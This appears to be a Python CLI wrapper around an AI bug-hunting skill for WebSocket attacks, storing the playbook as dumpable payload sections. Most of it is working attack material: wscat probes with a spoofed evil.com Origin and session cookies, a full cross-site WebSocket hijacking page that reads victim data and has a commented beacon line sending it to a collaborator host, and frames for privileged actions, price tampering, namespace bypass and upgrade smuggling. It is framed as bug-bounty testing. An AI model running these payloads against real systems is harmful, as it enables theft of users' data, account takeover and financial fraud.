#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
AUTO-GENERATED from Cybermes skill: claude-bughunter/hunt-websocket

Skill: HUNT-WEBSOCKET — WebSocket Security
Desc : Hunt WebSocket vulnerabilities — Cross-Site WebSocket Hijacking (CSWSH), missing/weak Origin validation on the WS handshake, no per-message authentication, message tampering, socket.io namespace/room authorization bypass, and handshake-layer Upgrade smuggling. Use when target has WebSocket endpoints (ws:// or wss://), socket.io / SignalR / Phoenix Channels, real-time features, chat, live dashboards, notifications, or trading platforms.

Run:  python claude-bughunter-hunt-websocket.py --help
      python claude-bughunter-hunt-websocket.py --list
      python claude-bughunter-hunt-websocket.py --dump <section>
"""
import sys, json, argparse

NAME = 'claude-bughunter/hunt-websocket'
TITLE = 'HUNT-WEBSOCKET — WebSocket Security'
DESCRIPTION = 'Hunt WebSocket vulnerabilities — Cross-Site WebSocket Hijacking (CSWSH), missing/weak Origin validation on the WS handshake, no per-message authentication, message tampering, socket.io namespace/room authorization bypass, and handshake-layer Upgrade smuggling. Use when target has WebSocket endpoints (ws:// or wss://), socket.io / SignalR / Phoenix Channels, real-time features, chat, live dashboards, notifications, or trading platforms.'

PAYLOADS = {
    'main': ["name: hunt-websocket", "description: \"Hunt WebSocket vulnerabilities \u2014 Cross-Site WebSocket Hijacking (CSWSH), missing/weak Origin validation on the WS handshake, no per-message authentication, message tampering, socket.io namespace/room authorization bypass, and handshake-layer Upgrade smuggling. Use when target has WebSocket endpoints (ws:// or wss://), socket.io / SignalR / Phoenix Channels, real-time features, chat, live dashboards, notifications, or trading platforms.\"", "sources: hackerone_public, portswigger_research, cve", "report_count: 11"],
    'hunt-websocket-websocket-security': [],
    'crown-jewel-targets': ["CSWSH (Cross-Site WebSocket Hijacking) with a cookie-authenticated handshake and no CSRF/per-connection token = High\u2013Critical (real-time exfil of any logged-in victim's data).", "**Highest-value chains:**", "- **CSWSH \u2192 data exfil / ATO** \u2014 handshake authenticates via ambient cookie, no CSRF token, Origin not enforced \u2192 attacker page opens WS as the victim and streams their messages/PII/tokens. If the stream carries a session/refresh/CSRF token, this escalates to ATO.", "- **No per-message auth** \u2014 HTTP/handshake auth present but individual WS frames are not re-authorized \u2192 privileged messages accepted (`deleteUser`, `getSecretConfig`).", "- **Message tampering** \u2014 modify in-flight frames (price, qty, userId, amount) in trading/game/checkout apps \u2192 financial fraud.", "- **socket.io namespace / room authz bypass** \u2014 connect to a privileged namespace or join another user's room without a permission check \u2192 cross-tenant real-time exfil.", "- **Handshake-layer Upgrade smuggling** \u2014 a malformed `Upgrade`/`Connection`/`Sec-WebSocket-*` handshake makes the front proxy and origin disagree on whether an upgrade occurred \u2192 request-smuggling tunnel."],
    'grounding-reference-cases-read-before-hunting': ["These are public, verifiable references. Use them to calibrate what a *real* WS finding looks like and how it was proven. Do not invent additional report IDs or payouts."],
    'phase-1-discover-websocket-endpoints': ["```bash"],
    'grep-js-for-ws-connections-handshake-urls-socket-io-clients': ["grep -rE \"new WebSocket|io\\(|io\\.connect|socket\\.io|new SockJS|signalr|Phoenix\\.Socket|wss?://\" \\", "recon/$TARGET/ --include=\"*.js\" 2>/dev/null | \\", "grep -oE \"(wss?://[^'\\\"]+|/[a-zA-Z0-9/_.-]*socket[^'\\\"]*|/signalr[^'\\\"]*|/cable\\b)\" | sort -u"],
    'crawl-urls-for-realtime-hints': ["grep -iE \"socket|/ws\\b|websocket|stream|realtime|live|chat|events|/cable|/signalr|notifications\" \\", "recon/$TARGET/urls.txt | sort -u"],
    'probe-handshake-101-upgrade-supported': ["curl -sI -o /dev/null -w \"%{http_code}\\n\" \\", "-H \"Connection: Upgrade\" -H \"Upgrade: websocket\" \\", "-H \"Sec-WebSocket-Version: 13\" \\", "-H \"Sec-WebSocket-Key: $(head -c16 /dev/urandom | base64)\" \\", "\"https://$TARGET/ws\""],
    'socket-io-polling-handshake-leaks-version-sid': ["curl -s \"https://$TARGET/socket.io/?EIO=4&transport=polling\" | head -c 300; echo"],
    'non-standard-ws-ports': ["nmap -sV -p 80,443,3000,3001,8080,8443,8888,9000 $TARGET 2>/dev/null | grep open", "In Burp Pro, use `get_proxy_websocket_history` (and the WebSockets tab) after browsing the app to enumerate live sockets, message schemas, and which frames carry auth-sensitive data."],
    'phase-2-cswsh-cross-site-websocket-hijacking': ["CSWSH requires THREE conditions together: (a) the handshake authenticates via an **ambient credential** (cookie sent automatically), (b) there is **no unpredictable per-connection token** in the handshake (no CSRF token / no token in URL/body), and (c) the server **does not enforce Origin**. Missing any one breaks the attack.", "```bash"],
    'step-1-confirm-handshake-auth-model-in-devtools-network-ws-headers': [],
    'look-for-cookie-session-and-the-absence-of-any-per-request-token': [],
    'no-token-no-sec-websocket-protocol-carrying-a-bearer-no-body-nonce': [],
    'if-a-unique-token-rides-the-handshake-cswsh-is-not-exploitable-cross-site': [],
    'step-2-probe-origin-enforcement-this-is-a-signal-not-a-confirmation': ["wscat -c \"wss://$TARGET/ws\" \\", "--header \"Origin: https://evil.com\" \\", "--header \"Cookie: session=YOUR_SESSION\""],
    'a-101-from-a-foreign-origin-only-proves-the-handshake-opened': [],
    'it-does-not-confirm-cswsh-the-server-may-still-validate-origin-at-the': [],
    'message-layer-refuse-to-stream-authenticated-data-or-require-a-token': [],
    'in-the-first-app-level-frame-treat-101-as-candidate-move-to-step-3': ["```html", "<!-- Step 3 \u2014 Real PoC: host on attacker origin, open while a SEPARATE victim", "account is logged into TARGET in the same browser. The bug is only", "confirmed if attacker JS RECEIVES the victim's data (or successfully", "sends a privileged frame). Cross-origin JS cannot set Origin/Cookie \u2014", "the browser does, which is exactly the threat model. -->", "<html><body><pre id=\"out\"></pre><script>", "var marker = \"CSWSH-\" + Math.random().toString(36).slice(2);   // unique per run", "var ws = new WebSocket(\"wss://TARGET/ws\");                     // attacker cannot forge Origin", "ws.onopen = () => {", "log(\"[+] 101 opened from attacker origin\");", "ws.send(JSON.stringify({type:\"subscribe\", channel:\"user_notifications\", _m:marker}));", "ws.onmessage = e => {", "log(\"VICTIM-DATA: \" + e.data);", "// Exfil PROOF to your Collaborator/listener so receipt is logged out-of-band:", "// navigator.sendBeacon(\"https://<collab-id>.oastify.com/cswsh?d=\" + encodeURIComponent(e.data));", "ws.onerror = e => log(\"ERR (likely Origin/auth rejected at message layer)\");", "function log(s){document.getElementById(\"out\").textContent += s + \"\\n\";}", "</script></body></html>", "**False-positive killers:**", "- A completed `101` from `Origin: evil.com` is NOT a finding. Many servers accept the upgrade and then send nothing, or close on the first authenticated frame.", "- Verify the data you receive belongs to a **different account** than the attacker, using a unique marker / distinct victim PII you planted in account B.", "- Exfil the received payload to **Burp Collaborator / an OAST listener** so receipt is recorded out-of-band \u2014 this is your impact proof for the report.", "- If a per-connection token rides the handshake (in the URL, a sub-protocol, or the first frame), CSWSH is **not** cross-site exploitable; downgrade or drop."],
    'phase-3-missing-weak-authentication-on-ws-messages': ["Handshake auth \u2260 per-message auth. Apps often authenticate the socket once, then trust every subsequent frame.", "```bash"],
    'no-cookie-at-all-does-the-server-process-app-frames': ["wscat -c \"wss://$TARGET/ws\""],
    'type-getuserdata-userid-1': [],
    'type-getadminpanel': [],
    'low-priv-session-sending-high-priv-actions': ["wscat -c \"wss://$TARGET/ws\" --header \"Cookie: session=LOW_PRIV_SESSION\""],
    'action-deleteuser-userid-999': [],
    'action-getsecretconfig': ["**Validate:** the privileged action must produce a real effect (a deleted test user, returned secret config, a state change visible via a second channel) \u2014 a frame that is *accepted and silently ignored* is not a finding. Re-run as an unauthenticated client to confirm the action is not simply broadcast to everyone harmlessly."],
    'replay-of-signed-messages': ["If messages carry signatures (e.g., `{\"type\":\"payment\",\"amount\":100,\"signature\":\"...\"}`), test replay for freshness and session binding. Capture a signed message and test: (a) **time-window bypass**: replay the message after its expiry timestamp (clock skew/validation gap), (b) **session bypass**: capture a signed message from user A's session and replay it in user B's session \u2014 if accepted, the signature was not bound to the user/session ID. Use Burp Repeater to store and replay signed frames, or reconstruct the same message in `wscat` after a time window has passed."],
    'business-logic-abuse-state-machine-bypass-rate-limit-evasion': ["Stateful protocols (e.g., a trading platform expecting `connect \u2192 authenticate \u2192 verify_balance \u2192 place_order`) may accept messages out of order or skip prerequisites. Test: (a) **state skip**: connect and immediately send `place_order` without `authenticate` or `verify_balance` first \u2014 many stacks don't enforce strict ordering if individual message validation is missing, (b) **high-frequency spam**: send identical or high-volume messages rapidly to bypass WS-layer rate limits (different from HTTP rate limits) \u2014 test 100s of messages/second to see if the server throttles, returns 429, or closes the connection. If it accepts and processes all, this can abuse business logic (e.g., many small payments to bypass amount caps, or rapid subscriptions to exhaust resources)."],
    'phase-4-message-tampering-financial-game-checkout': ["```bash"],
    'intercept-edit-in-burp-proxy-websockets-history-right-click-send-to': [],
    'repeater-or-edit-and-forward-try-server-trusted-client-values': [],
    'price-100-price-0-01': [],
    'amount-1-amount-9999': [],
    'userid-123-userid-1-impersonate-admin': [],
    'ordertotal-recompute-downstream': [],
    'wscat-replay-of-a-tampered-frame': ["wscat -c \"wss://$TARGET/trade\" --header \"Cookie: session=SESSION\""],
    'action-buy-amount-1-price-0-01': ["**Validate:** the tampered value must persist server-side \u2014 confirm via the REST/order API or a fresh socket that the order/balance/price actually reflects the manipulation. Many UIs echo your own frame back optimistically; that echo is NOT proof. Demonstrate financial/state impact, ideally on a sandbox/test instrument."],
    'phase-5-socket-io-signalr-phoenix-namespace-room-authz-bypass': ["Engine.IO/socket.io is a protocol layered over the raw WebSocket. Packet prefixes (Engine.IO `4`=MESSAGE wrapping socket.io `0`=CONNECT, `1`=DISCONNECT, `2`=EVENT) carry namespace/room intent. Authorization must be checked when joining; often it isn't.", "```bash"],
    '1-open-the-raw-socket-io-websocket-engine-io-v4': ["wscat -c \"wss://$TARGET/socket.io/?EIO=4&transport=websocket\" \\", "--header \"Cookie: session=YOUR_SESSION\""],
    '2-respond-to-the-server-s-engine-io-open-0-so-the-connection-lives': [],
    'then-connect-to-a-namespace-with-a-socket-io-connect-packet': [],
    'correct-packet-to-join-the-admin-namespace-40-admin': [],
    '4-engine-io-message-0-socket-io-connect-admin-namespace': [],
    'not-a-nsp-query-param-see-phase-7-not-42-42-is-message-event': [],
    '40-admin': [],
    'server-replies-40-admin-sid-on-success-or-44-admin-error': [],
    'on-rejection-a-40-success-to-a-privileged-namespace-as-a-low-no-priv': [],
    'user-is-the-bug': [],
    '3-once-in-a-namespace-emit-an-event-42-to-join-another-user-s-room': [],
    '42-admin-join-room-user-999-private': [],
    '42-subscribe-channel-admin-events-root-namespace': [],
    'watch-for-42-event-frames-carrying-another-user-s-data': ["**Validate:** distinguish *connected to namespace* from *received privileged data*. The finding is confirmed only when you receive `42` event frames containing data belonging to a different tenant/user, or a privileged emit produces a verifiable server-side effect. A `40/admin` ack with no subsequent data may just be an open-but-empty namespace."],
    'phase-6-handshake-layer-upgrade-smuggling-not-frame-smuggling': ["Important: once a WebSocket is established, your payloads are wrapped in WS frames and are **never re-parsed as HTTP** by the proxy. Typing `GET /admin HTTP/1.1` into an open `wscat` session does nothing. WebSocket-related smuggling lives at the **handshake**, before any frames exist.", "The real technique: send a WebSocket Upgrade request that the **front proxy** and the **origin** interpret differently \u2014 e.g. a bad `Sec-WebSocket-Version` that makes the origin reply `426 Upgrade Required` (or `400`) while the proxy has already decided the connection is \"upgraded\" and stops parsing HTTP. The proxy then tunnels subsequent bytes straight to the origin as an opaque stream, letting you smuggle arbitrary HTTP requests past front-end controls (WAF/authz).", "```bash"],
    'detection-is-http-layer-not-frame-layer-use-burp-repeater-send-http1-request': [],
    'and-toggle-one-handshake-variable-at-a-time-comparing-front-vs-origin-behavior': [],
    'a-valid-looking-upgrade-but-unsupported-version': [],
    'upgrade-websocket': [],
    'connection-upgrade': [],
    'sec-websocket-version-777-origin-should-426-does-the-proxy-still-tunnel': [],
    'sec-websocket-key-16-byte-base64': [],
    'b-upgrade-header-present-but-connection-keep-alive-mismatch': [],
    'c-smuggled-second-request-body-after-a-successful-101-then-send-a-normal': [],
    'follow-up-request-on-the-same-connection-and-watch-for-a-desynced-response': ["Drive this with Burp Pro's **HTTP Request Smuggler** extension (it has WebSocket-upgrade test cases) rather than by hand. **Validate** exactly like classic smuggling: prove desync via a timing/differential probe AND show real impact (reach an internal/forbidden path, poison a cached response, or capture another user's request) \u2014 confirmed against **Burp Collaborator / OAST**, never on a single ambiguous response."],
    'phase-7-socket-io-engine-io-specifics': ["```bash"],
    'version-initial-sid-handshake-json-after-the-leading-engine-io-digit': ["curl -s \"https://$TARGET/socket.io/?EIO=4&transport=polling\" | head -c 300; echo"],
    'old-eol-socket-io-stacks-have-known-issues-fingerprint-the-version-then-check-that-release-s-advisories': [],
    'fingerprint-the-client-lib-version-from-js-bundles-too': [],
    'namespace-selection-is-a-protocol-message-not-a-url-param': [],
    'wrong-wscat-c-wss-target-socket-io-eio-4-transport-websocket-nsp-admin': [],
    'nsp-is-not-a-recognized-socket-io-query-param-it-is-silently': [],
    'ignored-and-you-connect-to-the-root-namespace-you-will-believe': [],
    'you-tested-admin-when-you-did-not': [],
    'right-open-the-socket-then-send-the-connect-packet-40-admin-phase-5': [],
    'forged-replayed-sid-against-the-polling-transport-session-fixation-hijack-probe': ["curl -s \"https://$TARGET/socket.io/?EIO=4&transport=polling&sid=FAKE_OR_VICTIM_SID\""],
    '400-session-id-unknown-good-a-200-that-resumes-another-sid-s-stream-bug': [],
    'tools': ["```bash", "npm install -g wscat                 # CLI WS client (raw + socket.io)", "brew install websocat                # alt client; supports text/binary + autoreconnect"],
    'burp-suite-pro-websockets-history-intercept-edit-replay-http-request': [],
    'smuggler-extension-handshake-upgrade-smuggling-collaborator-for-oast-proof': [],
    'burp-mcp-get-proxy-websocket-history-get-proxy-websocket-history-regex-to': [],
    'enumerate-frames-generate-collaborator-payload-get-collaborator-interactions': [],
    'to-prove-out-of-band-receipt-from-a-cswsh-smuggling-poc': [],
    'chain-table': [],
    'validation-mandatory-before-reporting': ["- \u2705 **CSWSH:** attacker-origin PoC HTML, opened with a *different* victim account logged in, must **receive that victim's data** (verified by a unique planted marker / distinct PII) and exfil it to **Collaborator/OAST**. A bare `101` from a foreign Origin is NOT a finding.", "- \u2705 **No per-message auth:** privileged frame produces a **verifiable server-side effect** (state change confirmed via a second channel / REST API), not merely \"accepted\".", "- \u2705 **Message tampering:** tampered value **persists server-side** (confirmed via order/balance API), not just echoed in the UI.", "- \u2705 **Namespace/room bypass:** received **`42` event frames with another user's data**, not just a `40` namespace ack.", "- \u2705 **Upgrade smuggling:** desync proven by timing/differential probe **and** real-world impact, **OAST-confirmed**. No single-response guesses.", "- \u274c Reject: a 101 alone, an accepted-but-ignored frame, a self-echoed message, a connected-but-empty namespace, or any \"confirmed\" claim lacking out-of-band/cross-account proof.", "**Severity:**", "- CSWSH leaking session/refresh token \u2192 ATO: **Critical**", "- CSWSH \u2192 real-time session-data theft: **High**", "- No auth on admin/privileged WS actions: **Critical**", "- Financial message tampering (server-confirmed): **Critical**", "- Namespace/room subscription bypass (cross-tenant): **High**"],
}

def main():
    ap = argparse.ArgumentParser(description=DESCRIPTION, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--list", action="store_true", help="list sections")
    ap.add_argument("--dump", metavar="SECTION", help="dump payloads for a section")
    ap.add_argument("--search", metavar="KEYWORD", help="search payloads")
    args = ap.parse_args()
    if args.list or not (args.dump or args.search):
        print("=== %s ===" % TITLE)
        print(DESCRIPTION)
        print()
        print("Sections (%d):" % len(PAYLOADS))
        for k in PAYLOADS:
            print("  -", k, "(%d payloads)" % len(PAYLOADS[k]))
        if args.list:
            return
    if args.dump:
        if args.dump not in PAYLOADS:
            print("Section not found. Available:", list(PAYLOADS.keys()))
            sys.exit(1)
        for p in PAYLOADS[args.dump]:
            print(p)
        return
    if args.search:
        q = args.search.lower()
        hits = 0
        for k, v in PAYLOADS.items():
            for p in v:
                if q in p.lower():
                    print("[%s] %s" % (k, p))
                    hits += 1
        print("\n%d hits" % hits)
        return

if __name__ == "__main__":
    main()